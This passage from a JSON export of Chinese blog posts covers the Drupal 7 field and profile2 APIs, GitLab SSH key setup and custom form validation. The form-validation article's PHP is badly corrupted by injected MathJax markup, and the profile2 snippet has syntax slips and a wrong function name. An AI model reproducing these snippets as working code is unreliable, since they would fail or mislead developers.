font-size:14px\">\r\n&nbsp;</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n不需要搞得如此复杂，仅仅需要单一的&#20540;就行了。诸如此类的情况下该怎么办？这种情况下可以使用2个函数。其一是field_get_items() 。它会返回具有正确语言设置的字段信息数组（根据需要也可以指定语言）。此处所获取的数据可以利用于服务器端的处理。例如图像字段的alt文本想在其他地方使用等等。但是需要注意的是特别是用户输入的原数据，为了避免安全隐患，使用此类数据前需要进行正确的检验处理。</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n&nbsp;</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n另一个是field_view_value()。当需要渲染字段单一的&#20540;时，它会返回已检验处理过的渲染数组。参数也可以传递&#26684;式设置信息。从field_get_items()的返回数组中获取单一的&#20540;如下。</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n</p>\r\n<pre class=\"php;\" style=\"margin-top:15px; margin-bottom:20px; padding:10px 15px; border-color:rgb(204,204,204); border-style:solid; border-width:1px 1px 1px 5px; white-space:pre-wrap; color:rgb(76,81,84); font-size:14px; line-height:25.2000007629395px; background:rgb(244,245,247)\">$node = node_load($nid);\n$field = field_get_items('node', $node, 'field_name');\n$output = field_view_value('node', $node, 'field_name', $field[$delta]);</pre>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n$delta是字段元素中的key。如果是单一的&#20540;的话此处为0.</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n&nbsp;</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n最后在介绍一个有趣的示例。为了显示图像字段，设置它的图像样式和node的链接。此处field_view_value()和field_view_field()是相同的结果。</p>\r\n<pre class=\"php;\" style=\"margin-top:15px; margin-bottom:20px; padding:10px 15px; border-color:rgb(204,204,204); border-style:solid; border-width:1px 1px 1px 5px; white-space:pre-wrap; color:rgb(76,81,84); font-size:14px; line-height:25.2000007629395px; background:rgb(244,245,247)\">$node = node_load($nid);\n$image = field_get_items('node', $node, 'field_image');\n$output = field_view_value('node', $node, 'field_image', $image[0], array(\n  'type' =&gt; 'image',\n  'settings' =&gt; array(\n    'image_style' =&gt; 'thumbnail',\n    'image_link' =&gt; 'content',\n  ),\n));</pre>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n&nbsp;</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n如上所示，当我们需要把特定的字段显示在block中，只要通过field API就能实现！干净简单！而且返回的是渲染数组，在通过模板文件进行渲染之前，可以根据需要对他的结构进行再次加工。同时 field_view_field()和field_view_value() 的返回&#20540;都是已经正确检验处理过的。</p>\r\n<br>\r\n",
			"tags":"entity,drupal 7,字段",
			"id":"44996721",
			"categories":"drupal-7",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2015年04月10日 08:48:29",
			"articleedittype":1,
			"private":0,
			"channel":"17",
			"description":"1.下载git工具包，我用的是http://git-scm.com/download/win这个git工具包\n2.生成sshkey。在git工具上使用shh-keygen命令然后根据提示生成了sshkey，位置我的是在c/users/小川/.ssh/id_rsa.pub上，打开文件复制里面的代码\n\n\n\n3.在gitlab上添加keys。例如我们团队的地址是http://gitlab.al",
			"title":"团队开发之在win下使用gitlab环境进行团队协作",
			"type":"original",
			"content":"\r\n<p>1.下载git工具包，我用的是http://git-scm.com/download/win这个git工具包</p>\r\n<p>2.生成sshkey。在git工具上使用shh-keygen命令然后根据提示生成了sshkey，位置我的是在c/users/小川/.ssh/id_rsa.pub上，打开文件复制里面的代码</p>\r\n<p><img src=\"http://img.blog.csdn.net/20150410085151163?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXV1cXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center\" alt=\"\"></p>\r\n<p><br>\r\n</p>\r\n<p>3.在gitlab上添加keys。例如我的地址是<span style=\"color:rgb(77,77,77); font-family:宋体; font-size:14px; line-height:24px\">http://***.***.com/profile/keys</span></p>\r\n<p><span style=\"font-family:宋体; color:#4d4d4d\"><span style=\"font-size:14px; line-height:24px\">添加完成后就可以开始你的开发之旅了</span></span></p>\r\n",
			"tags":"gitlab,团队,shh,git",
			"id":"44974657",
			"categories":"git使用",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2015年04月07日 09:50:10",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"注：本教程纯手打原创，如有雷同，必定抄袭我的。本文版权归属yoqu，如果有哪位转载请署名作者。最近公司有个项目，由我做用户操作这一块，由于drupal自带的profile不是很友好，所以用户属性是利用profile2进行定义的。我以其中属于哪个机房的属性来进行讲解吧。profile的增删改查操作",
			"title":"drupal7中利用profile2的api对使用profile2字段的对象进行操作|durpal profile2 api",
			"type":"original",
			"content":"<p><em>注：本教程纯手打原创，如有雷同，必定抄袭我的。本文版权归属yoqu，如果有哪位转载请署名作者。</em></p>\n\n<hr>\n\n<p>最近公司有个项目，由我做用户操作这一块，由于drupal自带的profile不是很友好，所以用户属性是利用profile2进行定义的。我以其中属于哪个机房的属性来进行讲解吧。</p>\n\n\n\n<h2 id=\"profile的增删改查操作\"><strong>profile的增删改查操作</strong></h2>\n\n\n\n<h2 id=\"1查操作\">1.查操作</h2>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\"><span class=\"hljs-variable\">$user</span>=user_load(<span class=\"hljs-variable\">$uid</span>);\n    <span class=\"hljs-variable\">$student</span>=profile2_load_by_user(<span class=\"hljs-variable\">$user</span>,<span class=\"hljs-string\">'student'</span>);</code></pre>\n\n<p>这个函数官方有文档，通过用户对象返回用户的profile2的对象，当然可能用户定义了几个profile。我们用到的是student这个profile。 <br>\n    然后利用field_get_items()获得指定的字段 <br>\n    例如机房的机器名叫做machine_room. <br>\n    使用</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\"> <span class=\"hljs-variable\">$machine_room</span>=field_get_items(<span class=\"hljs-string\">'profile2'</span>,<span class=\"hljs-variable\">$student</span>,<span class=\"hljs-string\">'field_machine_room'</span>));</code></pre>\n\n<p>结果返回的是一个数组，直接取出你想要的值就可以进行其他操作了。</p>\n\n<hr>\n\n\n\n<h2 id=\"2增操作\">2.增操作</h2>\n\n<p>增加操作指的是已有用户，但是用户没有添加profile对象。这一步我研究了好久，大概按照我的理解是这样的。 <br>\n  <strong>1.先取出一个用户</strong></p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\"> <span class=\"hljs-variable\">$account</span>=user_load(<span class=\"hljs-variable\">$uid</span>);</code></pre>\n\n<p><strong>2.得到profile。</strong></p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\">  <span class=\"hljs-variable\">$profile</span> = profile2_load_by_user(<span class=\"hljs-variable\">$account</span>,<span class=\"hljs-string\">'student'</span>);</code></pre>\n\n<p><strong>3.判断如果不存在就新建</strong></p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs php\"> <span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-variable\">$profile</span>) {\n        创建一个新的profile\n         <span class=\"hljs-variable\">$profile</span> = profile_create(<span class=\"hljs-keyword\">array</span>(\n         <span class=\"hljs-comment\">//设置profile的类型</span>\n         <span class=\"hljs-string\">'type'</span>=&gt;<span class=\"hljs-string\">'student'</span>,\n         <span class=\"hljs-comment\">//指定对哪个用户进行操作</span>\n         <span class=\"hljs-string\">'uid'</span>=&gt;<span class=\"hljs-variable\">$account</span>-&gt;uid,\n         <span class=\"hljs-comment\">//这一步对机房赋值001个人感觉我这里太麻烦，不知可以简单点不。</span>\n         <span class=\"hljs-string\">'field_machine_room'</span>=&gt;<span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">'und'</span>=&gt;<span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">'0'</span>=&gt;<span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">'value'</span>=&gt;<span class=\"hljs-string\">'001'</span>,),),),\n         )\n         );\n    }</code></pre>\n\n<p><strong>4.修改值之后进行一个保存</strong></p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\"> profile2_save(<span class=\"hljs-variable\">$profile</span>);</code></pre>\n\n<hr>\n\n\n\n<h2 id=\"3改操作\">3.改操作</h2>\n\n<p>步骤和2差不多，不过不用判断是否存在我就不再细说</p>\n\n\n\n<h2 id=\"4删除操作\">4.删除操作</h2>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\"> profile2_delete(Profile <span class=\"hljs-variable\">$profile</span>);\n</code></pre>\n\n<p>调用删除函数，官方给的函数是这样的:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs php\"> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">profile2_delete</span><span class=\"hljs-params\">(Profile <span class=\"hljs-variable\">$profile</span>)</span> {</span>\n  <span class=\"hljs-variable\">$profile</span>-&gt;delete();\n    }</code></pre>\n\n<p>通过查操作里面的profile2_load_by_user得到一个profile对象，然后调用profile2_delete函数即可进行删除操作。</p>\n\n<hr>\n\n<p>好了，本次学习到此结束，欢迎和大家一起交流经验。如果有什么问题可以发邮件问我，我的邮箱yoqulin@qq.com，也可以私信我。</p>",
			"markdowncontent":"*注：本教程纯手打原创，如有雷同，必定抄袭我的。本文版权归属yoqu，如果有哪位转载请署名作者。*\n\n\n----------\n最近公司有个项目，由我做用户操作这一块，由于drupal自带的profile不是很友好，所以用户属性是利用profile2进行定义的。我以其中属于哪个机房的属性来进行讲解吧。\n\n**profile的增删改查操作**\n--------------\n\n1.查操作\n-----\n\n```\n$user=user_load($uid);\n    $student=profile2_load_by_user($user,'student');\n```\n 这个函数官方有文档，通过用户对象返回用户的profile2的对象，当然可能用户定义了几个profile。我们用到的是student这个profile。\n    然后利用field_get_items()获得指定的字段\n    例如机房的机器名叫做machine_room.\n    使用\n```\n $machine_room=field_get_items('profile2',$student,'field_machine_room'));\n```\n 结果返回的是一个数组，直接取出你想要的值就可以进行其他操作了。\n \n\n\n----------\n\n\n2.增操作\n-----\n增加操作指的是已有用户，但是用户没有添加profile对象。这一步我研究了好久，大概按照我的理解是这样的。\n  **1.先取出一个用户**\n \n```\n $account=user_load($uid);\n```\n**2.得到profile。**\n\n```\n  $profile = profile2_load_by_user($account,'student');\n```\n **3.判断如果不存在就新建**\n \n\n```\n if (!$profile) {\n        创建一个新的profile\n         $profile = profile_create(array(\n         //设置profile的类型\n         'type'=>'student',\n         //指定对哪个用户进行操作\n         'uid'=>$account->uid,\n         //这一步对机房赋值001个人感觉我这里太麻烦，不知可以简单点不。\n         'field_machine_room'=>array('und'=>array('0'=>array('value'=>'001',),),),\n         )\n         );\n    }\n```\n**4.修改值之后进行一个保存**\n\n```\n profile2_save($profile);\n```\n\n\n----------\n\n\n3.改操作\n-----\n 步骤和2差不多，不过不用判断是否存在我就不再细说\n\n4.删除操作\n------\n\n```\n profile2_delete(Profile $profile);\n\n```\n 调用删除函数，官方给的函数是这样的:\n\n```\n function profile2_delete(Profile $profile) {\n  $profile->delete();\n    }\n```\n通过查操作里面的profile2_load_by_user得到一个profile对象，然后调用profile2_delete函数即可进行删除操作。\n\n\n----------\n\n\n好了，本次学习到此结束，欢迎和大家一起交流经验。如果有什么问题可以发邮件问我，我的邮箱yoqulin@qq.com，也可以私信我。",
			"tags":"drupal,api,属性,操作",
			"id":"44916421",
			"categories":"drupal-7",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2015年04月06日 22:46:15",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"注：原文链接：http://befused.com/drupal/form-validation（翻译水平有限，还望海涵） \nstart： \n表单验证是web系统中必不可少的一部分，你需要确保用户输入的信息是否是可取的，如果不可取会反馈错误信息 \n感谢Drupal钩子，你可以简单的在任何一个表单中增加验证，即使你并没有创建这个表单。在这个教程里面，你会学习怎样用验证函数去验证一篇文章表单，增加一篇文",
			"title":"drupal7之学习在已存在的form表单中增加自定义验证（Learn how to add custom validation to an existing Drupal form）",
			"type":"translated",
			"content":"<p>注：原文链接：<a href=\"http://befused.com/drupal/form-validation\">http://befused.com/drupal/form-validation</a>（翻译水平有限，还望海涵） <br>\nstart： <br>\n表单验证是web系统中必不可少的一部分，你需要确保用户输入的信息是否是可取的，如果不可取会反馈错误信息 <br>\n感谢Drupal钩子，你可以简单的在任何一个表单中增加验证，即使你并没有创建这个表单。在这个教程里面，你会学习怎样用验证函数去验证一篇文章表单，增加一篇文章的的地址在这里 node/add/article <br>\n 示例你要确保用户不能增加这个标题打的文章：” the quick fox jumped over the lazy dog”,如果写下了这个标题，则返回一个错误信息。 <br>\n在这个教程中，你可能需要下载和开启一个叫devel的开发神器来打印消息(dpm函数)。</p>\n\n\n\n<h2 id=\"alter-the-form\"><strong>Alter the form</strong></h2>\n\n<p>增加一个新的验证函数，你需要去alter下这个表单（至于为什么我不细讲了，就是重写下表单）如果看不懂看完这里应该就会了（ <br>\n○17天开始模块开发（<a href=\"http://befused.com/drupal/form-alter\">http://befused.com/drupal/form-alter</a>） <br>\n○23天开始模块开发。（<a href=\"http://befused.com/drupal/first-module\">http://befused.com/drupal/first-module</a>） <br>\n） <br>\nOK，我们开始吧 </p>\n\n<p>“` <br>\n1.  function starting_drupal_dev_form_alter(&amp;<span class=\"MathJax_Preview\"></span><span class=\"MathJax\" id=\"MathJax-Element-33-Frame\" role=\"textbox\" aria-readonly=\"true\"><span class=\"math\" id=\"MathJax-Span-104\"><span class=\"noError\" id=\"MathJax-Span-105\" style=\"display: inline-block;\">form,&nbsp;&amp;</span></span></span><script type=\"math/tex\" id=\"MathJax-Element-33\">form, &</script>form_state, <span class=\"MathJax_Preview\"></span><span class=\"MathJax\" id=\"MathJax-Element-34-Frame\" role=\"textbox\" aria-readonly=\"true\"><span class=\"math\" id=\"MathJax-Span-106\" style=\"vertical-align: -0.531em;\"><span class=\"noError\" id=\"MathJax-Span-107\" style=\"display: inline-block;\">form_id)&nbsp;{&nbsp;&nbsp;<br>2.&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(</span></span></span><script type=\"math/tex\" id=\"MathJax-Element-34\">form_id) {  \n2.    if (</script>form_id == ‘article_node_form’) { <br>\n3.      dpm($form[‘#validate’]); <br>\n4.    } <br>\n5.  } </p>\n\n<p>“`从上面代码可以看到，我们第一步判断form的ID是否是acticle_node_form，然后用dpm($form[‘#validate’]),。它列出了所有的验证函数。 <br>\n当你点击进/node/add/acticle页面，你可以看见node_form_validate(), <br>\n<img src=\"http://img.blog.csdn.net/20150406223536156\" alt=\"这里写图片描述\" title=\"\"></p>\n\n\n\n<h2 id=\"增加一个验证处理的handler这个词一下子不知道怎么翻译了\">增加一个验证处理的handler(这个词一下子不知道怎么翻译了)</h2>\n\n<p>你需要增加一个验证函数到$form[‘#validate’]这个数组里面 <br>\n函数名：’ starting_drupal_dev_form_validate’</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs markdown\"><span class=\"hljs-bullet\">1.  </span>function starting<span class=\"hljs-emphasis\">_drupal_</span>dev<span class=\"hljs-emphasis\">_form_</span>alter(&amp;$form, &amp;$form<span class=\"hljs-emphasis\">_state, $form_</span>id) {\n<span class=\"hljs-bullet\">2.    </span>if ($form<span class=\"hljs-emphasis\">_id == 'article_</span>node_form') {\n<span class=\"hljs-bullet\">3.      </span>$form['#validate'][] = 'starting<span class=\"hljs-emphasis\">_drupal_</span>dev<span class=\"hljs-emphasis\">_form_</span>validate';\n<span class=\"hljs-bullet\">4.      </span>dpm($form['#validate']);\n<span class=\"hljs-bullet\">5.    </span>}\n<span class=\"hljs-bullet\">6.  </span>} \n\n<span class=\"hljs-code\">```</span>你现在可以在打印机上看见这里有两个验证handlers.核心的 node<span class=\"hljs-emphasis\">_form_</span>validate是其中的一个![<span class=\"hljs-link_label\">这里写图片描述</span>](<span class=\"hljs-link_url\">http://img.blog.csdn.net/20150406223756947</span>)\n创建一个验证函数：\n现在你需要增加一个回调函数starting<span class=\"hljs-emphasis\">_drupal_</span>dev<span class=\"hljs-emphasis\">_form_</span>validate()\n\n\n\n\n\n<span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">div</span> <span class=\"hljs-attribute\">class</span>=<span class=\"hljs-value\">\"se-preview-section-delimiter\"</span>&gt;</span></span><span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">div</span>&gt;</span></span>\n</code></pre>\n\n<ol>\n<li>function starting_drupal_dev_form_validate(<span class=\"MathJax_Preview\"></span><span class=\"MathJax\" id=\"MathJax-Element-47-Frame\" role=\"textbox\" aria-readonly=\"true\"><span class=\"math\" id=\"MathJax-Span-132\"><span class=\"noError\" id=\"MathJax-Span-133\" style=\"display: inline-block;\">form,&nbsp;&amp;</span></span></span><script type=\"math/tex\" id=\"MathJax-Element-47\">form, &</script>form_state) {</li>\n<li> <br>\n<ol><li>}  <br>\n<code>`当表单被提交后，这个表单的值存放在$form_state里面，你可以打印出来看一看</code></li></ol></li>\n</ol>\n\n<pre class=\"prettyprint\"><code class=\" hljs \">这里写代码片</code></pre>\n\n<pre class=\"prettyprint\"><code class=\" hljs php\"><span class=\"hljs-number\">1.</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">starting_drupal_dev_form_validate</span><span class=\"hljs-params\">(<span class=\"hljs-variable\">$form</span>, &amp;<span class=\"hljs-variable\">$form_state</span>)</span> {</span>\n<span class=\"hljs-number\">2.</span>   \n<span class=\"hljs-number\">3.</span>  } \n``当表单被提交后，这个表单的值存放在<span class=\"hljs-variable\">$form_state</span>里面，你可以打印出来看一看`\n</code></pre>\n\n<ol>\n<li>function starting_drupal_dev_form_validate(<span class=\"MathJax_Preview\"></span><span class=\"MathJax\" id=\"MathJax-Element-72-Frame\" role=\"textbox\" aria-readonly=\"true\"><span class=\"math\" id=\"MathJax-Span-182\"><span class=\"noError\" id=\"MathJax-Span-183\" style=\"display: inline-block;\">form,&nbsp;&amp;</span></span></span><script type=\"math/tex\" id=\"MathJax-Element-72\">form, &</script>form_state) {</li>\n<li>dpm($form_state);</li>\n<li>}</li>\n</ol>\n\n<p><img src=\"http://img.blog.csdn.net/20150406223933807\" alt=\"这里写图片描\" title=\"\"> <br>\n找到你需要的字段。$form_state[‘values’][’title’] <br>\n如果这个值为“the quick fox jumped over the lazy dog”就返回一个错误 <br>\n<img src=\"http://img.blog.csdn.net/20150406223959660\" alt=\"这里写图片描述\" title=\"\"></p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs markdown\"><span class=\"hljs-bullet\">1.  </span>function starting<span class=\"hljs-emphasis\">_drupal_</span>dev<span class=\"hljs-emphasis\">_form_</span>validate($form, &amp;$form_state) {\n<span class=\"hljs-bullet\">2.    </span>if ($form_state[<span class=\"hljs-link_label\">'values'</span>][<span class=\"hljs-link_reference\">'title'</span>] == 'the quick fox jumped over the lazy dog') {\n<span class=\"hljs-bullet\">3.      </span>form<span class=\"hljs-emphasis\">_set_</span>error('title', t('You have added an invalid title.'));\n<span class=\"hljs-bullet\">4.    </span>}\n<span class=\"hljs-bullet\">5.  </span>}\n\n<span class=\"hljs-strong\">**```我们先分析下上面的函数**</span>\n</code></pre>\n\n<p>if ($form_state[‘values’][‘title’] == ‘the quick fox jumped over the lazy dog) <br>\n这里是一个简单的判断函数 <br>\n如果它的值是the quick fox jumped over the lazy dog它将返回真 <br>\n然后里面的代码将会被执行</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs markdown\">form<span class=\"hljs-emphasis\">_set_</span>error('title', t('You are not allowed to use \"the quick fox jumped over the lazy dog\" as a title.')<span class=\"hljs-code\">```</span>\n\n![<span class=\"hljs-link_label\">这里写图片描述</span>](<span class=\"hljs-link_url\">http://img.blog.csdn.net/20150406224134945</span>)\n\n<span class=\"hljs-header\">验证多种标题\n------</span>\n现在我们来试着用两个值进行验证。第二个值就取：“birds of a feather flock together”\n</code></pre>\n\n<ol>\n<li>function starting_drupal_dev_form_validate(<span class=\"MathJax_Preview\"></span><span class=\"MathJax\" id=\"MathJax-Element-81-Frame\" role=\"textbox\" aria-readonly=\"true\"><span class=\"math\" id=\"MathJax-Span-336\"><span class=\"noError\" id=\"MathJax-Span-337\" style=\"display: inline-block;\">form,&nbsp;&amp;</span></span></span><script type=\"math/tex\" id=\"MathJax-Element-81\">form, &</script>form_state) {</li>\n<li>$invalid_titles = array(‘the quick fox jumped over the lazy dog’, ‘birds of a feather flock together’);</li>\n<li>if (in_array(<span class=\"MathJax_Preview\"></span><span class=\"MathJax\" id=\"MathJax-Element-82-Frame\" role=\"textbox\" aria-readonly=\"true\"><nobr><span class=\"math\" id=\"MathJax-Span-338\" style=\"width: 14.776em; display: inline-block;\"><span style=\"display: inline-block; position: relative; width: 11.789em; height: 0px; font-size: 125%;\"><span style=\"position: absolute; clip: rect(1.709em 1000.003em 3.149em -0.424em); top: -2.717em; left: 0.003em;\"><span class=\"mrow\" id=\"MathJax-Span-339\"><span class=\"mi\" id=\"MathJax-Span-340\" style=\"font-family: MathJax_Math-italic;\">f<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.056em;\"></span></span><span class=\"mi\" id=\"MathJax-Span-341\" style=\"font-family: MathJax_Math-italic;\">o</span><span class=\"mi\" id=\"MathJax-Span-342\" style=\"font-family: MathJax_Math-italic;\">r</span><span class=\"msubsup\" id=\"MathJax-Span-343\"><span style=\"display: inline-block; position: relative; width: 1.336em; height: 0px;\"><span style=\"position: absolute; clip: rect(1.976em 1000.003em 2.723em -0.477em); top: -2.557em; left: 0.003em;\"><span class=\"mi\" id=\"MathJax-Span-344\" style=\"font-family: MathJax_Math-italic;\">m</span><span style=\"display: inline-block; width: 0px; height: 2.563em;\"></span></span><span style=\"position: absolute; top: -2.291em; left: 0.909em;\"><span class=\"mi\" id=\"MathJax-Span-345\" style=\"font-size: 70.7%; font-family: MathJax_Math-italic;\">s</span><span style=\"display: inline-block; width: 0px; height: 2.456em;\"></span></span></span></span><span class=\"mi\" id=\"MathJax-Span-346\" style=\"font-family: MathJax_Math-italic;\">t</span><span class=\"mi\" id=\"MathJax-Span-347\" style=\"font-family: MathJax_Math-italic;\">a</span><span class=\"mi\" id=\"MathJax-Span-348\" style=\"font-family: MathJax_Math-italic;\">t</span><span class=\"mi\" id=\"MathJax-Span-349\" style=\"font-family: MathJax_Math-italic;\">e</span><span class=\"msup\" id=\"MathJax-Span-350\"><span style=\"display: inline-block; position: relative; width: 0.589em; height: 0px;\"><span style=\"position: absolute; clip: rect(1.816em 1000.003em 3.149em -0.371em); top: -2.717em; left: 0.003em;\"><span class=\"mo\" id=\"MathJax-Span-351\" style=\"font-family: MathJax_Main;\">[</span><span style=\"display: inline-block; width: 0px; height: 2.723em;\"></span></span><span style=\"position: absolute; top: -2.984em; left: 0.323em;\"><span class=\"mo\" id=\"MathJax-Span-352\" style=\"font-size: 70.7%; font-family: MathJax_Main;\">′</span><span style=\"display: inline-block; width: 0px; height: 2.509em;\"></span></span></span></span><span class=\"mi\" id=\"MathJax-Span-353\" style=\"font-family: MathJax_Math-italic;\">v</span><span class=\"mi\" id=\"MathJax-Span-354\" style=\"font-family: MathJax_Math-italic;\">a</span><span class=\"mi\" id=\"MathJax-Span-355\" style=\"font-family: MathJax_Math-italic;\">l</span><span class=\"mi\" id=\"MathJax-Span-356\" style=\"font-family: MathJax_Math-italic;\">u</span><span class=\"mi\" id=\"MathJax-Span-357\" style=\"font-family: MathJax_Math-italic;\">e</span><span class=\"msup\" id=\"MathJax-Span-358\"><span style=\"display: inline-block; position: relative; width: 0.749em; height: 0px;\"><span style=\"position: absolute; clip: rect(1.976em 1000.003em 2.723em -0.424em); top: -2.557em; left: 0.003em;\"><span class=\"mi\" id=\"MathJax-Span-359\" style=\"font-family: MathJax_Math-italic;\">s</span><span style=\"display: inline-block; width: 0px; height: 2.563em;\"></span></span><span style=\"position: absolute; top: -2.877em; left: 0.483em;\"><span class=\"mo\" id=\"MathJax-Span-360\" style=\"font-size: 70.7%; font-family: MathJax_Main;\">′</span><span style=\"display: inline-block; width: 0px; height: 2.509em;\"></span></span></span></span><span class=\"mo\" id=\"MathJax-Span-361\" style=\"font-family: MathJax_Main;\">]</span><span class=\"msup\" id=\"MathJax-Span-362\"><span style=\"display: inline-block; position: relative; width: 0.589em; height: 0px;\"><span style=\"position: absolute; clip: rect(1.816em 1000.003em 3.149em -0.371em); top: -2.717em; left: 0.003em;\"><span class=\"mo\" id=\"MathJax-Span-363\" style=\"font-family: MathJax_Main;\">[</span><span style=\"display: inline-block; width: 0px; height: 2.723em;\"></span></span><span style=\"position: absolute; top: -2.984em; left: 0.323em;\"><span class=\"mo\" id=\"MathJax-Span-364\" style=\"font-size: 70.7%; font-family: MathJax_Main;\">′</span><span style=\"display: inline-block; width: 0px; height: 2.509em;\"></span></span></span></span><span class=\"mi\" id=\"MathJax-Span-365\" style=\"font-family: MathJax_Math-italic;\">t</span><span class=\"mi\" id=\"MathJax-Span-366\" style=\"font-family: MathJax_Math-italic;\">i</span><span class=\"mi\" id=\"MathJax-Span-367\" style=\"font-family: MathJax_Math-italic;\">t</span><span class=\"mi\" id=\"MathJax-Span-368\" style=\"font-family: MathJax_Math-italic;\">l</span><span class=\"msup\" id=\"MathJax-Span-369\"><span style=\"display: inline-block; position: relative; width: 0.749em; height: 0px;\"><span style=\"position: absolute; clip: rect(1.976em 1000.003em 2.723em -0.424em); top: -2.557em; left: 0.003em;\"><span class=\"mi\" id=\"MathJax-Span-370\" style=\"font-family: MathJax_Math-italic;\">e</span><span style=\"display: inline-block; width: 0px; height: 2.563em;\"></span></span><span style=\"position: absolute; top: -2.877em; left: 0.483em;\"><span class=\"mo\" id=\"MathJax-Span-371\" style=\"font-size: 70.7%; font-family: MathJax_Main;\">′</span><span style=\"display: inline-block; width: 0px; height: 2.509em;\"></span></span></span></span><span class=\"mo\" id=\"MathJax-Span-372\" style=\"font-family: MathJax_Main;\">]</span><span class=\"mo\" id=\"MathJax-Span-373\" style=\"font-family: MathJax_Main;\">,</span></span><span style=\"display: inline-block; width: 0px; height: 2.723em;\"></span></span></span><span style=\"border-left-width: 0.003em; border-left-style: solid; display: inline-block; overflow: hidden; width: 0px; height: 1.537em; vertical-align: -0.397em;\"></span></span></nobr></span><script type=\"math/tex\" id=\"MathJax-Element-82\">form_state['values']['title'], </script>invalid_titles)) {</li>\n<li>form_set_error(‘title’, t(‘You have added an invalid title.’));</li>\n<li>}</li>\n<li>}</li>\n</ol>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs \">拆分来看看吧\n</code></pre>\n\n<p>$invalid_titles = array(‘the quick fox jumped over the lazy dog’, ‘birds of a feather flock together’);</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs \">首先，我们创建了一个需要判断标题的数组\n</code></pre>\n\n<p>if (in_array(<span class=\"MathJax_Preview\"></span><span class=\"MathJax\" id=\"MathJax-Element-102-Frame\" role=\"textbox\" aria-readonly=\"true\"><nobr><span class=\"math\" id=\"MathJax-Span-1058\" style=\"width: 14.776em; display: inline-block;\"><span style=\"display: inline-block; position: relative; width: 11.789em; height: 0px; font-size: 125%;\"><span style=\"position: absolute; clip: rect(1.709em 1000.003em 3.149em -0.424em); top: -2.717em; left: 0.003em;\"><span class=\"mrow\" id=\"MathJax-Span-1059\"><span class=\"mi\" id=\"MathJax-Span-1060\" style=\"font-family: MathJax_Math-italic;\">f<span style=\"display: inline-block; overflow: hidden; height: 1px; width: 0.056em;\"></span></span><span class=\"mi\" id=\"MathJax-Span-1061\" style=\"font-family: MathJax_Math-italic;\">o</span><span class=\"mi\" id=\"MathJax-Span-1062\" style=\"font-family: MathJax_Math-italic;\">r</span><span class=\"msubsup\" id=\"MathJax-Span-1063\"><span style=\"display: inline-block; position: relative; width: 1.336em; height: 0px;\"><span style=\"position: absolute; clip: rect(1.976em 1000.003em 2.723em -0.477em); top: -2.557em; left: 0.003em;\"><span class=\"mi\" id=\"MathJax-Span-1064\" style=\"font-family: MathJax_Math-italic;\">m</span><span style=\"display: inline-block; width: 0px; height: 2.563em;\"></span></span><span style=\"position: absolute; top: -2.291em; left: 